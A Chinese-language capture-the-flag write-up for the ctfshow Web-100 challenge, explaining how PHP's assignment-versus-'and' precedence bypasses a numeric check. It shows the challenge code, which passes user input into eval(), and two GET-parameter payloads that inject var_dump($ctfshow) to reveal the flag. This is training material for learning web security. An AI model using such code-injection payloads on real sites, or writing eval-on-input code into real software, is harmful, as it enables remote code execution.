if(isset($_GET['n']) && in_array($_GET['n'], $allow))

Ctf-Show-Web-100

这个要掌握的是在PHP中的一个运算级优先级问题。

看代码：

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
//赋值优先级高于and优先级，所以只需要让$v1为数字就可以走下去
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
  //正则限制了一下v2和v3。
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}

构造payload

?v1=1&v2=var_dump($ctfshow)&v3=;

或者采用注释的方式

?v1=1&v2=var_dump($ctfshow)/*&v3=*/;

两种方式都可以，只要能同时满足正则并且执行构造的语句var_dump($ctfshow);就可以了。
